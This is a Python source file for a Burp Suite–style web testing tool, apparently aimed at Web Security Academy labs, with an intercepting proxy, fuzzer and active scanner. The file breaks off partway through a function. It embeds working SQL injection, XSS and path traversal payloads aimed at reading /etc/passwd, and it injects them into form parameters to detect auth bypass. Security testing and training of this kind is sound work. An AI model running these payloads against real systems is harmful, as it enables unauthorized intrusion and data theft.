#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import threading
import time
import base64
import urllib.parse
import asyncio
import re
import importlib.util
from collections import deque

# إعدادات كروما المدمج لمنع مشاكل الـ SSL Pinning
os.environ["QTWEBENGINE_CHROMIUM_FLAGS"] = "--ignore-certificate-errors --test-type --no-sandbox"

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QCheckBox, QListWidget, QListWidgetItem, QPlainTextEdit,
    QPushButton, QTableWidget, QTableWidgetItem, QHeaderView,
    QDialog, QFormLayout, QLineEdit, QLabel, QComboBox, QMessageBox, QTabWidget, QFileDialog
)
from PyQt5.QtCore import Qt, QTimer, QUrl, QRegExp
from PyQt5.QtGui import QSyntaxHighlighter, QTextCharFormat, QColor, QFont
from PyQt5.QtNetwork import QNetworkProxy, QNetworkCookie
from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEngineProfile

try:
    from mitmproxy import options, master
    from mitmproxy.addons import default_addons
except ImportError:
    print("[-] يرجى تثبيت mitmproxy: pip install mitmproxy")
    sys.exit(1)

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[-] يرجى تثبيت requests: pip install requests")
    sys.exit(1)

addon = None

# ==========================================
# 1. ترسانة الـ Payloads المتطورة
# ==========================================
PAYLOADS_DATABASE = {
    "SQLi": [
        "administrator'--",
        "1'/*!50000OR*/1=1--+",
        "1'/**/OR/**/1=1/**/#",
        "1' UNION/*&*/SELECT/*&*/NULL,version()--+",
        "-1' OR 3+2=5-`-`",
        "1' AND extractvalue(rand(),concat(0x3a,version()))--+"
    ],
    "XSS": [
        "<svg/onanimationstart=alert(1) style=animation:frames><keyframes frames{from{font-size:0}to{font-size:10px}}></svg>",
        "<details open ontoggle=alert(1)>",
        "\"-alert(1)-\"",
        "javascript:/*--></title></style></textarea></script></comment><svg/onload='this.onload=alert(1)'>"
    ],
    "LFI_Traversal": [
        "../../../../../../../../etc/passwd",
        "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
}


# ==========================================
# 2. ميزة تلوين النصوص الاحترافية (Syntax Highlighter)
# ==========================================
class HTTPHighlighter(QSyntaxHighlighter):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.highlighting_rules = []

        method_format = QTextCharFormat()
        method_format.setForeground(QColor("#ff6600"))
        method_format.setFontWeight(QFont.Bold)
        self.highlighting_rules.append((QRegExp(r"\b(GET|POST|PUT|DELETE|CONNECT|OPTIONS)\b"), method_format))

        header_format = QTextCharFormat()
        header_format.setForeground(QColor("#a9b7c6"))
        header_format.setFontWeight(QFont.Bold)
        self.highlighting_rules.append((QRegExp(r"(^[A-Za-z0-9-]+:)(?= )"), header_format))

        http_format = QTextCharFormat()
        http_format.setForeground(QColor("#569cd6"))
        self.highlighting_rules.append((QRegExp(r"HTTP/[0-9.]+"), http_format))

        status_format = QTextCharFormat()
        status_format.setForeground(QColor("#4ec9b0"))
        status_format.setFontWeight(QFont.Bold)
        self.highlighting_rules.append((QRegExp(r"\b(200|201|301|302|403|404|500)\b"), status_format))

        intruder_format = QTextCharFormat()
        intruder_format.setBackground(QColor("#4b3212"))
        intruder_format.setForeground(QColor("#ffcc00"))
        intruder_format.setFontWeight(QFont.Bold)
        self.highlighting_rules.append((QRegExp(r"§[^§]*§"), intruder_format))

    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            expression = QRegExp(pattern)
            index = expression.indexIn(text)
            while index >= 0:
                length = expression.matchedLength()
                self.setFormat(index, length, format)
                index = expression.indexIn(text, index + length)


# ==========================================
# 3. نظام الـ Proxy وتعديل الحزم الطائرة والموديولات
# ==========================================
class InterceptAddon:
    def __init__(self):
        self.lock = threading.Lock()
        self.intercept_requests = False
        self.intercept_responses = False
        self.intercepted_flows = deque()
        self.flows_dict = {}
        self.master = None
        self.match_replace_rules = []
        self.plugins = []
        self.load_plugins()

    def load_plugins(self):
        if not os.path.exists("plugins"):
            os.makedirs("plugins")
            return
        for file in os.listdir("plugins"):
            if file.endswith(".py"):
                try:
                    spec = importlib.util.spec_from_file_location(file[:-3], os.path.join("plugins", file))
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    if hasattr(module, "Plugin"):
                        self.plugins.append(module.Plugin())
                        print(f"[+] Loaded plugin: {file}")
                except Exception as e:
                    print(f"[-] Failed to load plugin {file}: {e}")

    def request(self, flow):
        with self.lock:
            for r_type, match, replace in self.match_replace_rules:
                if r_type == "Request Header" and match in flow.request.headers:
                    flow.request.headers[match] = replace
                elif r_type == "Request Body" and flow.request.content:
                    body = flow.request.content.decode(errors='ignore')
                    if match in body:
                        flow.request.content = body.replace(match, replace).encode()

            for plugin in self.plugins:
                try:
                    plugin.process_request(flow)
                except:
                    pass

            if self.intercept_requests:
                flow.intercept()
                self.intercepted_flows.append(flow)
                self.flows_dict[flow.id] = flow

    def response(self, flow):
        with self.lock:
            for r_type, match, replace in self.match_replace_rules:
                if r_type == "Response Body" and flow.response.content:
                    body = flow.response.content.decode(errors='ignore')
                    if match in body:
                        flow.response.content = body.replace(match, replace).encode()

            for plugin in self.plugins:
                try:
                    plugin.process_response(flow)
                except:
                    pass

            if self.intercept_responses:
                flow.intercept()
                self.intercepted_flows.append(flow)
                self.flows_dict[flow.id] = flow


def start_proxy():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    opts = options.Options(listen_host='127.0.0.1', listen_port=8080)
    opts.ssl_insecure = True

    global addon
    m = master.Master(opts, event_loop=loop)
    addon = InterceptAddon()
    addon.master = m
    m.addons.add(addon)
    m.addons.add(*default_addons())
    try:
        loop.run_until_complete(m.run())
    except Exception as e:
        print("[!] Proxy stopped:", e)


# ==========================================
# 4. الواجهة البرمجية الرئيسية للأداة (v4.3)
# ==========================================
class BrowserWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("BurpSuite Professional Clone - Advanced Suite v4.3")
        self.resize(1380, 900)

        self.proxy_host = "127.0.0.1"
        self.proxy_port = 8080
        self.flow_data = {}
        self.flow_items = {}
        self.temp_cookies = []

        self.apply_burp_dark_theme()
        self._init_ui()
        self._setup_proxy_browser()
        self._start_intercept_timer()

    def apply_burp_dark_theme(self):
        dark_stylesheet = """
            QMainWindow, QDialog { background-color: #2b2b2b; color: #e6e6e6; }
            QTabWidget::pane { border: 1px solid #3c3f41; background-color: #2b2b2b; }
            QTabBar::tab { background-color: #3c3f41; color: #bbbbbb; padding: 8px 15px; border: 1px solid #2b2b2b; font-weight: bold; }
            QTabBar::tab:selected { background-color: #2b2b2b; color: #ff6600; border-bottom: 2px solid #ff6600; }
            QPushButton { background-color: #3c3f41; color: #e6e6e6; border: 1px solid #555555; padding: 6px 12px; border-radius: 3px; font-weight: bold;}
            QPushButton:hover { background-color: #4c5052; border: 1px solid #ff6600; }
            QPushButton:pressed { background-color: #ff6600; color: #ffffff; }
            QPlainTextEdit, QLineEdit, QComboBox, QListWidget { background-color: #232323; color: #a9b7c6; border: 1px solid #4a4a4a; font-family: "Courier New", Monospace; font-size: 11pt; }
            QTableWidget { background-color: #232323; color: #a9b7c6; gridline-color: #3c3f41; border: 1px solid #4a4a4a; font-family: "Courier New"; }
            QHeaderView::section { background-color: #313335; color: #bbbbbb; padding: 4px; border: 1px solid #2b2b2b; }
            QCheckBox { color: #e6e6e6; spacing: 5px; }
            QCheckBox::indicator { width: 14px; height: 14px; background-color: #232323; border: 1px solid #555555; }
            QCheckBox::indicator:checked { background-color: #ff6600; border: 1px solid #ff6600; }
            QLabel { color: #ff6600; font-weight: bold; }
        """
        self.setStyleSheet(dark_stylesheet)

    def _init_ui(self):
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        self.proxy_tab = QWidget()
        self._setup_proxy_tab()
        self.tabs.addTab(self.proxy_tab, "Proxy")

        self.repeater_tab = QWidget()
        self._setup_repeater_tab()
        self.tabs.addTab(self.repeater_tab, "Repeater")

        self.intruder_tab = QWidget()
        self._setup_intruder_tab()
        self.tabs.addTab(self.intruder_tab, "Intruder")

        self.scanner_tab = QWidget()
        self._setup_scanner_tab()
        self.tabs.addTab(self.scanner_tab, "Active Scanner")

        self.decoder_tab = QWidget()
        self._setup_decoder_tab()
        self.tabs.addTab(self.decoder_tab, "Decoder")

        self.cookies_tab = QWidget()
        self._setup_cookies_tab()
        self.tabs.addTab(self.cookies_tab, "Cookies")

        self.browser_tab = QWidget()
        self._setup_browser_tab()
        self.tabs.addTab(self.browser_tab, "Target Browser")

    def _setup_proxy_tab(self):
        layout = QVBoxLayout(self.proxy_tab)
        top_bar = QHBoxLayout()
        self.intercept_req_check = QCheckBox("Intercept Requests")
        self.intercept_resp_check = QCheckBox("Intercept Responses")
        self.intercept_req_check.toggled.connect(self.toggle_intercept_req)
        self.intercept_resp_check.toggled.connect(self.toggle_intercept_resp)
        top_bar.addWidget(self.intercept_req_check)
        top_bar.addWidget(self.intercept_resp_check)
        top_bar.addStretch()
        layout.addLayout(top_bar)

        main_splitter = QHBoxLayout()
        self.intercept_list = QListWidget()
        self.intercept_list.setMaximumWidth(280)
        self.intercept_list.currentItemChanged.connect(self.on_flow_selected)
        main_splitter.addWidget(self.intercept_list)

        editors_layout = QVBoxLayout()
        editors_layout.addWidget(QLabel("HTTP Request Panel:"))
        self.req_editor = QPlainTextEdit()
        self.req_highlighter = HTTPHighlighter(self.req_editor.document())
        editors_layout.addWidget(self.req_editor)

        fast_routing_layout = QHBoxLayout()
        self.send_to_repeater_btn = QPushButton("👉 Send to Repeater")
        self.send_to_repeater_btn.clicked.connect(self.send_current_to_repeater)
        self.send_to_intruder_btn = QPushButton("🎯 Send to Intruder")
        self.send_to_intruder_btn.clicked.connect(self.send_current_to_intruder)
        self.send_to_scanner_btn = QPushButton("⚡ Send to Active Scanner")
        self.send_to_scanner_btn.clicked.connect(self.send_current_to_scanner)
        fast_routing_layout.addWidget(self.send_to_repeater_btn)
        fast_routing_layout.addWidget(self.send_to_intruder_btn)
        fast_routing_layout.addWidget(self.send_to_scanner_btn)
        editors_layout.addLayout(fast_routing_layout)

        editors_layout.addWidget(QLabel("HTTP Response Panel:"))
        self.resp_editor = QPlainTextEdit()
        self.resp_highlighter = HTTPHighlighter(self.resp_editor.document())
        editors_layout.addWidget(self.resp_editor)

        editors_layout.addWidget(QLabel("Match & Replace Rules (Auto-Pilot):"))
        self.mr_table = QTableWidget(0, 3)
        self.mr_table.setHorizontalHeaderLabels(["Type", "Match Text", "Replace With"])
        self.mr_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.mr_table.setFixedHeight(80)
        editors_layout.addWidget(self.mr_table)

        mr_btns = QHBoxLayout()
        add_mr_btn = QPushButton("+ Add Rule")
        add_mr_btn.clicked.connect(self.add_mr_rule)
        clear_mr_btn = QPushButton("Clear Rules")
        clear_mr_btn.clicked.connect(self.clear_mr_rules)
        mr_btns.addWidget(add_mr_btn)
        mr_btns.addWidget(clear_mr_btn)
        editors_layout.addLayout(mr_btns)

        btn_layout = QHBoxLayout()
        forward_btn = QPushButton("Forward Package")
        forward_btn.clicked.connect(self.forward_flow)
        drop_btn = QPushButton("Drop Package")
        drop_btn.clicked.connect(self.drop_flow)
        btn_layout.addWidget(forward_btn)
        btn_layout.addWidget(drop_btn)
        editors_layout.addLayout(btn_layout)

        main_splitter.addLayout(editors_layout)
        layout.addLayout(main_splitter)

    def _setup_repeater_tab(self):
        layout = QVBoxLayout(self.repeater_tab)
        splitter = QHBoxLayout()
        req_side = QVBoxLayout()
        req_side.addWidget(QLabel("Request Pane (Editable):"))
        self.repeater_request = QPlainTextEdit()
        self.rep_req_highlighter = HTTPHighlighter(self.repeater_request.document())
        req_side.addWidget(self.repeater_request)

        self.repeater_use_proxy = QCheckBox("Send through local Proxy Interceptor (8080)")
        self.repeater_use_proxy.setChecked(True)
        req_side.addWidget(self.repeater_use_proxy)

        rep_send_btn = QPushButton("🚀 Send HTTP Request")
        rep_send_btn.setFixedHeight(40)
        rep_send_btn.clicked.connect(self.send_repeater)
        req_side.addWidget(rep_send_btn)

        resp_side = QVBoxLayout()
        resp_side.addWidget(QLabel("Response Pane:"))
        self.repeater_response = QPlainTextEdit()
        self.repeater_response.setReadOnly(True)
        self.rep_resp_highlighter = HTTPHighlighter(self.repeater_response.document())
        resp_side.addWidget(self.repeater_response)

        splitter.addLayout(req_side)
        splitter.addLayout(resp_side)
        layout.addLayout(splitter)

    def _setup_intruder_tab(self):
        layout = QVBoxLayout(self.intruder_tab)
        layout.addWidget(QLabel("🎯 Intruder Engine: Wrap specific parameter values with '§' to force fuzzing."))
        splitter = QHBoxLayout()
        left_config = QVBoxLayout()
        self.intruder_request = QPlainTextEdit()
        self.int_highlighter = HTTPHighlighter(self.intruder_request.document())
        left_config.addWidget(self.intruder_request)

        wl_layout = QHBoxLayout()
        self.wl_path_lbl = QLineEdit()
        self.wl_path_lbl.setPlaceholderText("No wordlist file loaded...")
        self.wl_path_lbl.setReadOnly(True)
        load_wl_btn = QPushButton("Browse Wordlist")
        load_wl_btn.clicked.connect(self.browse_wordlist)
        wl_layout.addWidget(self.wl_path_lbl)
        wl_layout.addWidget(load_wl_btn)
        left_config.addLayout(wl_layout)

        start_attack_btn = QPushButton("🔥 Launch BruteForce / Fuzzing Attack")
        start_attack_btn.setFixedHeight(40)
        start_attack_btn.clicked.connect(self.start_intruder_attack)
        left_config.addWidget(start_attack_btn)

        right_results = QVBoxLayout()
        self.intruder_table = QTableWidget(0, 4)
        self.intruder_table.setHorizontalHeaderLabels(["ID", "Payload Used", "Status Code", "Length"])
        self.intruder_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        right_results.addWidget(self.intruder_table)

        splitter.addLayout(left_config, 45)
        splitter.addLayout(right_results, 55)
        layout.addLayout(splitter)

    def _setup_scanner_tab(self):
        layout = QVBoxLayout(self.scanner_tab)
        layout.addWidget(QLabel("⚡ Active Scanner: Auto-injecting advanced obfuscated payloads into all parameters."))

        main_splitter = QHBoxLayout()

        left_side = QVBoxLayout()
        self.scanner_request_template = QPlainTextEdit()
        self.scan_highlighter = HTTPHighlighter(self.scanner_request_template.document())
        left_side.addWidget(self.scanner_request_template)

        launch_scan_btn = QPushButton("🔒 Start Full Vulnerability Scan")
        launch_scan_btn.setFixedHeight(42)
        launch_scan_btn.setStyleSheet("background-color: #ff6600; color: white; font-size: 11pt;")
        launch_scan_btn.clicked.connect(self.start_active_scan)
        left_side.addWidget(launch_scan_btn)
        main_splitter.addLayout(left_side, 35)

        right_side = QVBoxLayout()
        right_side.addWidget(QLabel("Vulnerabilities Found / Scan Logs:"))

        self.scanner_table = QTableWidget(0, 5)
        self.scanner_table.setHorizontalHeaderLabels(
            ["Param Location", "Parameter Name", "Payload Type", "Risk Level", "Status/Details"])
        self.scanner_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        right_side.addWidget(self.scanner_table, 65)

        right_side.addWidget(QLabel("💻 Live Activity Visual Log:"))
        self.live_logger = QPlainTextEdit()
        self.live_logger.setReadOnly(True)
        self.live_logger.setStyleSheet("background-color: #151515; color: #00ff00; font-family: 'Courier New';")
        right_side.addWidget(self.live_logger, 35)

        main_splitter.addLayout(right_side, 65)
        layout.addLayout(main_splitter)

    def _setup_decoder_tab(self):
        layout = QVBoxLayout(self.decoder_tab)
        layout.addWidget(QLabel("Transform Data (Encode/Decode Engine):"))
        self.dec_input = QPlainTextEdit()
        self.dec_input.setPlaceholderText("Enter cleartext or encoded string here...")
        layout.addWidget(self.dec_input)

        ctrl_bar = QHBoxLayout()
        self.dec_operation = QComboBox()
        self.dec_operation.addItems([
            "Base64 Encode", "Base64 Decode",
            "URL Encode", "URL Decode",
            "Hex Encode", "Hex Decode"
        ])
        dec_btn = QPushButton("Execute Transformation")
        dec_btn.clicked.connect(self.on_decoder_apply)
        ctrl_bar.addWidget(self.dec_operation)
        ctrl_bar.addWidget(dec_btn)
        layout.addLayout(ctrl_bar)

        self.dec_output = QPlainTextEdit()
        self.dec_output.setReadOnly(True)
        layout.addWidget(self.dec_output)

    def _setup_cookies_tab(self):
        layout = QVBoxLayout(self.cookies_tab)
        self.cookie_table = QTableWidget(0, 7)
        self.cookie_table.setHorizontalHeaderLabels(
            ["Domain", "Name", "Value", "Path", "Secure", "HttpOnly", "Expires"])
        self.cookie_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(self.cookie_table)

        cookie_btns = QHBoxLayout()
        refresh_cookie_btn = QPushButton("Refresh Global Cookie Storage")
        refresh_cookie_btn.clicked.connect(self.refresh_cookies)
        cookie_btns.addWidget(refresh_cookie_btn)
        layout.addLayout(cookie_btns)

    def _setup_browser_tab(self):
        layout = QVBoxLayout(self.browser_tab)
        nav_bar = QHBoxLayout()
        self.url_bar = QLineEdit()
        self.url_bar.setPlaceholderText("Enter target domain URL...")
        self.url_bar.returnPressed.connect(self.navigate_to_url)

        back_btn = QPushButton("←")
        back_btn.clicked.connect(lambda: self.browser.back())
        forward_btn = QPushButton("→")
        forward_btn.clicked.connect(lambda: self.browser.forward())
        reload_btn = QPushButton("↻")
        reload_btn.clicked.connect(lambda: self.browser.reload())

        nav_bar.addWidget(back_btn)
        nav_bar.addWidget(forward_btn)
        nav_bar.addWidget(reload_btn)
        nav_bar.addWidget(self.url_bar)
        layout.addLayout(nav_bar)

        self.browser = QWebEngineView()
        self.browser.setUrl(QUrl("about:blank"))
        layout.addWidget(self.browser)

    def _setup_proxy_browser(self):
        proxy = QNetworkProxy()
        proxy.setType(QNetworkProxy.HttpProxy)
        proxy.setHostName(self.proxy_host)
        proxy.setPort(self.proxy_port)
        QNetworkProxy.setApplicationProxy(proxy)

        self.profile = QWebEngineProfile.defaultProfile()
        self.profile.setHttpCacheType(QWebEngineProfile.NoCache)
        self.cookie_store = self.profile.cookieStore()

    def _start_intercept_timer(self):
        self.timer = QTimer()
        self.timer.timeout.connect(self.process_intercepted_flows)
        self.timer.start(400)

    def send_current_to_scanner(self):
        current_req = self.req_editor.toPlainText()
        if not current_req.strip(): return
        self.scanner_request_template.setPlainText(current_req)
        self.tabs.setCurrentIndex(3)

    # =========================================================
    # 5. محرك الفحص المتزامن المحدث لاصطياد الـ 302 Redirect
    # =========================================================
    def start_active_scan(self):
        template = self.scanner_request_template.toPlainText().strip()
        if not template:
            QMessageBox.warning(self, "Scanner Error", "Please import a request template first!")
            return

        self.scanner_table.setRowCount(0)
        self.live_logger.clear()
        self.live_logger.appendPlainText(f"[{time.strftime('%H:%M:%S')}] [+] Launching Active Scanner Engine...")

        QTimer.singleShot(100, lambda: self._run_scanner_engine(template))

    def _run_scanner_engine(self, template):
        try:
            template = template.strip()
            raw_lines = template.splitlines()
            if not raw_lines:
                self.live_logger.appendPlainText("[-] Error: Template is empty.")
                return

            req_line = raw_lines[0].strip().split()
            if len(req_line) < 2:
                self.live_logger.appendPlainText("[-] Error: Invalid Request Line.")
                return
            method = req_line[0]
            full_path = req_line[1]

            headers = {}
            body = ""

            for line in raw_lines[1:]:
                line_str = line.strip()
                if ":" in line_str and not body:
                    k, v = line_str.split(":", 1)
                    headers[k.strip()] = v.strip()
                elif "=" in line_str and ("username" in line_str or "csrf" in line_str or "password" in line_str):
                    body = line_str

            # السحر هنا: قراءة الـ Host ديناميكياً من الريكويست المنسوخ ليتطابق مع معملك الحالي
            host = headers.get('Host', headers.get('host', ''))
            if not host and "origin" in headers:
                host = headers["origin"].replace("https://", "").replace("http://", "").split('/')[0]

            if not host:
                host = "0a53005d0405ca9c827dc9bc00f70072.web-security-academy.net"

            base_url = f"https://{host}"
            path_only = full_path.split('?')[0] if '?' in full_path else full_path
            if not path_only.startswith('/'): path_only = '/' + path_only

            self.live_logger.appendPlainText(f"[DEBUG] Auto-Detected Lab Host: {base_url}")
            self.live_logger.appendPlainText(f"[DEBUG] Extracted Body: {body}")

            body_params = urllib.parse.parse_qsl(body) if body else []
            self.live_logger.appendPlainText(f"[DEBUG] POST Parameters Found: {len(body_params)}")

            if not body_params:
                self.live_logger.appendPlainText("[-] No parameters found to scan. Process aborted.")
                return

            def send_scan_request(m, u, h, d):
                try:
                    # نمنع الـ allow_redirects للقبض على كود الـ 302 المنقذ
                    r = requests.request(m, u, headers=h, data=d, verify=False, timeout=5, allow_redirects=False)
                    return r.status_code, r.text
                except Exception as e:
                    return 0, str(e)

            self.live_logger.appendPlainText("[+] Initiating parameter injection...")

            for p_name, p_val in body_params:
                for vuln_type, payloads in PAYLOADS_DATABASE.items():
                    for payload in payloads:
                        self.live_logger.appendPlainText(f"Testing Param '{p_name}' -> Vol: {vuln_type}")

                        mutated_body = [(k, payload if k == p_name else v) for k, v in body_params]
                        new_body_encoded = urllib.parse.urlencode(mutated_body)

                        scan_headers = headers.copy()
                        scan_headers['Content-Length'] = str(len(new_body_encoded))
                        scan_headers['Content-Type'] = 'application/x-www-form-urlencoded'

                        status, res_text = send_scan_request(method, f"{base_url}{path_only}", scan_headers,
                                                             new_body_encoded)
                        self._analyze_scan_response("POST Body", p_name, vuln_type, payload, status, res_text)

                        QApplication.processEvents()

            self.live_logger.appendPlainText("[+] Full Active Scan Completed.")

        except Exception as main_err:
            self.live_logger.appendPlainText(f"[-] Engine Crash: {str(main_err)}")

    def _analyze_scan_response(self, location, p_name, vuln_type, payload, status, res_text):
        is_vulnerable = False
        detail_msg = f"Status {status}"
        if not res_text and status == 0: return

        # التحديث الذكي لاصطياد الـ Authentication Bypass عبر الـ 302 الكاشف
        if vuln_type == "SQLi" and "administrator" in payload:
            if status == 302 or status == 301:
                is_vulnerable = True
                detail_msg = "CRITICAL: Auth Bypass Succeeded! Server redirected with 302 (Session Hijacked)."
            elif "welcome" in res_text.lower() or "logout" in res_text.lower() or "my account" in res_text.lower():
                is_vulnerable = True
                detail_msg = "CRITICAL: Auth Bypass Succeeded! Content verified inside page."

        elif vuln_type == "SQLi":
            sql_errors = ["sql syntax", "mysql_fetch", "ora-", "sqlite3", "postgresql", "xpath inspection",
                          "internal server error"]
            if any(err in res_text.lower() for err in sql_errors) or status == 500:
                is_vulnerable = True
                detail_msg = "Database Error Leak or 500 Internal Error detected in Response!"

        elif vuln_type == "XSS" and payload in res_text:
            is_vulnerable = True
            detail_msg = "Payload reflected directly into HTML output!"
        elif vuln_type == "LFI_Traversal" and ("root:x:" in res_text or "[boot loader]" in res_text):
            is_vulnerable = True
            detail_msg = "System file content read successfully!"

        if is_vulnerable:
            risk = "CRITICAL 🔴" if vuln_type == "SQLi" else "HIGH 🟠"
            self._add_scanner_row(location, p_name, vuln_type, risk, detail_msg)

    def _add_scanner_row(self, loc, name, v_type, risk, details):
        row = self.scanner_table.rowCount()
        self.scanner_table.insertRow(row)
        items = [QTableWidgetItem(loc), QTableWidgetItem(name), QTableWidgetItem(v_type), QTableWidgetItem(risk),
                 QTableWidgetItem(details)]
        for item in items:
            item.setForeground(QColor("#ff3333"))
            item.setFont(QFont("Arial", 10, QFont.Bold))
        self.scanner_table.setItem(row, 0, items[0])
        self.scanner_table.setItem(row, 1, items[1])
        self.scanner_table.setItem(row, 2, items[2])
        self.scanner_table.setItem(row, 3, items[3])
        self.scanner_table.setItem(row, 4, items[4])

    def start_intruder_attack(self):
        raw_template = self.intruder_request.toPlainText()
        wl_path = self.wl_path_lbl.text()
        if "§" not in raw_template:
            QMessageBox.warning(self, "Intruder Error", "Wrap target with '§' symbols!\nExample: pass=§123§")
            return
        if not os.path.exists(wl_path):
            QMessageBox.warning(self, "Intruder Error", "Select a valid wordlist file!")
            return
        self.intruder_table.setRowCount(0)
        threading.Thread(target=self._execute_intruder, args=(raw_template, wl_path), daemon=True).start()

    def _execute_intruder(self, template, wl_path):
        try:
            with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                payloads = [line.strip() for line in f if line.strip()]
            for idx, payload in enumerate(payloads):
                manipulated_req = re.sub(r"§[^§]*§", payload, template)
                lines = manipulated_req.splitlines()
                if not lines: continue
                request_line = lines[0].strip().split()
                if len(request_line) < 2: continue
                method, path = request_line[0], request_line[1]
                headers = {}
                body_start = -1
                for i in range(1, len(lines)):
                    if lines[i].strip() == '':
                        body_start = i + 1
                        break
                    if ':' in lines[i]:
                        k, v = lines[i].split(':', 1)
                        headers[k.strip()] = v.strip()
                body = '\n'.join(lines[body_start:]) if (body_start != -1 and body_start < len(lines)) else ""
                host = headers.get('Host', '')
                if not host: continue
                scheme = 'https' if (':443' in host or 'https' in path or method == 'CONNECT') else 'http'
                url = path if path.startswith('http') else f"{scheme}://{host}{path}"
                if body: headers['Content-Length'] = str(len(body.encode('utf-8')))
                try:
                    proxies = {'http': f'http://{self.proxy_host}:{self.proxy_port}',
                               'https': f'http://{self.proxy_host}:{self.proxy_port}'}
                    resp = requests.request(method, url, headers=headers,
                                            data=body.encode('utf-8', errors='replace') if body else None,
                                            proxies=proxies, verify=False, timeout=5)
                    status, length = str(resp.status_code), str(len(resp.content))
                except:
                    status, length = "ERR", "0"
                QTimer.singleShot(0, lambda p=payload, s=status, l=length, i=idx: self._add_intruder_row(i, p, s, l))
        except Exception as e:
            print(f"Intruder exception: {e}")

    def _add_intruder_row(self, idx, payload, status, length):
        row = self.intruder_table.rowCount()
        self.intruder_table.insertRow(row)
        self.intruder_table.setItem(row, 0, QTableWidgetItem(str(idx + 1)))
        self.intruder_table.setItem(row, 1, QTableWidgetItem(payload))
        self.intruder_table.setItem(row, 2, QTableWidgetItem(status))
        self.intruder_table.setItem(row, 3, QTableWidgetItem(length))

    def send_current_to_repeater(self):
        current_req = self.req_editor.toPlainText()
        if not current_req.strip(): return
        self.repeater_request.setPlainText(current_req)
        self.repeater_response.clear()
        self.tabs.setCurrentIndex(1)

    def send_current_to_intruder(self):
        current_req = self.req_editor.toPlainText()
        if not current_req.strip(): return
        self.intruder_request.setPlainText(current_req)
        self.tabs.setCurrentIndex(2)

    def add_mr_rule(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Add Auto Match & Replace Rule")
        form = QFormLayout(dialog)
        type_combo = QComboBox()
        type_combo.addItems(["Request Header", "Request Body", "Response Body"])
        match_edit = QLineEdit()
        replace_edit = QLineEdit()
        form.addRow("Target Type:", type_combo)
        form.addRow("String to Match:", match_edit)
        form.addRow("Replace With:", replace_edit)
        btn = QPushButton("Save Rule")
        btn.clicked.connect(dialog.accept)
        form.addRow(btn)
        if dialog.exec_():
            row = self.mr_table.rowCount()
            self.mr_table.insertRow(row)
            self.mr_table.setItem(row, 0, QTableWidgetItem(type_combo.currentText()))
            self.mr_table.setItem(row, 1, QTableWidgetItem(match_edit.text()))
            self.mr_table.setItem(row, 2, QTableWidgetItem(replace_edit.text()))
            global addon
            if addon:
                with addon.lock:
                    addon.match_replace_rules.append((type_combo.currentText(), match_edit.text(), replace_edit.text()))

    def clear_mr_rules(self):
        self.mr_table.setRowCount(0)
        global addon
        if addon:
            with addon.lock: addon.match_replace_rules.clear()

    def browse_wordlist(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Payload Wordlist", "",
                                                   "Text Files (*.txt);;All Files (*)")
        if file_path: self.wl_path_lbl.setText(file_path)

    def toggle_intercept_req(self, checked):
        global addon
        if addon:
            with addon.lock: addon.intercept_requests = checked

    def toggle_intercept_resp(self, checked):
        global addon
        if addon:
            with addon.lock: addon.intercept_responses = checked

    def on_flow_selected(self, current, previous):
        if not current:
            self.req_editor.clear()
            self.resp_editor.clear()
            return
        fid = current.data(Qt.UserRole)
        flow = self.flow_data.get(fid)
        if not flow: return
        try:
            req_text = f"{flow.request.method} {flow.request.path} {flow.request.http_version}\r\n"
            for k, v in flow.request.headers.items(): req_text += f"{k}: {v}\r\n"
            req_text += "\r\n"
            if flow.request.content: req_text += flow.request.content.decode('utf-8', errors='replace')
            self.req_editor.setPlainText(req_text)
        except:
            self.req_editor.setPlainText("[-] Error loading request.")
        if flow.response:
            try:
                resp_text = f"{flow.response.http_version} {flow.response.status_code} {flow.response.reason}\r\n"
                for k, v in flow.response.headers.items(): resp_text += f"{k}: {v}\r\n"
                resp_text += "\r\n"
                if flow.response.content: resp_text += flow.response.content.decode('utf-8', errors='replace')
                self.resp_editor.setPlainText(resp_text)
            except:
                self.resp_editor.setPlainText("[-] Error loading response.")
        else:
            self.resp_editor.clear()

    def process_intercepted_flows(self):
        global addon
        if not addon: return
        with addon.lock:
            while addon.intercepted_flows:
                flow = addon.intercepted_flows.popleft()
                fid = flow.id
                if fid in self.flow_items:
                    item = self.flow_items[fid]
                    if flow.response: item.setText(f"[{flow.request.method}] {flow.request.host} (Resp)")
                else:
                    item = QListWidgetItem(f"[{flow.request.method}] {flow.request.host}{flow.request.path}")
                    item.setData(Qt.UserRole, fid)
                    self.flow_items[fid] = item
                    self.intercept_list.addItem(item)
                self.flow_data[fid] = flow

    def apply_edits_to_flow(self, flow):
        try:
            if flow.response is None:
                raw = self.req_editor.toPlainText()
                lines = raw.splitlines()
                if not lines: return
                first_line = lines[0].strip().split()
                if len(first_line) >= 2:
                    flow.request.method = first_line[0]
                    flow.request.path = first_line[1]
                headers = {}
                body_start = 0
                for i, line in enumerate(lines[1:], 1):
                    if line.strip() == '':
                        body_start = i + 1
                        break
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                flow.request.headers.clear()
                for k, v in headers.items(): flow.request.headers[k] = v
                body = '\n'.join(lines[body_start:])
                flow.request.content = body.encode('utf-8', errors='replace')
            else:
                raw = self.resp_editor.toPlainText()
                lines = raw.splitlines()
                if not lines: return
